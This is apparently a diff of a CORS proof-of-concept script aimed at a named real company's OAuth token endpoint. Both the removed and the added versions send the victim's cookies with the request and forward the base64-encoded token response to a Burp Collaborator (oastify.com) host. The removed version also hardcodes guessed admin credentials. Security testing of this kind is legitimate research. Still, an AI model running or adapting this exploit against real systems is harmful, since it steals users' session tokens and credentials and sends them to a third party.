@@ -1,22 +1,15 @@
-<!DOCTYPE html>
-<html>
-  <body>
-    <h1>CORS PoC</h1>
-    <script>
-      fetch("https://auth.xchat.xfinity.com/oauth-server/oauth/token", {
-        method: "POST",
-        credentials: "include",
-        headers: {
-          "Content-Type": "application/x-www-form-urlencoded"
-        },
-        body: "client_id=SupervisorApplication&grant_type=password&username=admin&password=admin12345"
-      })
-      .then(res => res.text())
-      .then(data => {
-        // Replace this with your Burp Collaborator URL if testing exfiltration
-        fetch("https://iqcjdn37bkjxk122wxtumoq2dtjk7hv6.oastify.com/log?leak=" + btoa(data));
-        console.log("Response:", data);
-      });
-    </script>
-  </body>
-</html>
+<script>
+fetch("https://auth.xchat.xfinity.com/oauth-server/oauth/token", {
+  method: "GET",
+  credentials: "include"
+})
+.then(response => response.text())
+.then(data => {
+  // Exfiltrate the response
+  fetch("https://uljv8zyj6we9fdxer9o6h0le85ex2rqg.oastify.com", {
+    method: "POST",
+    mode: "no-cors",
+    body: btoa(data)
+  });
+});
+</script>
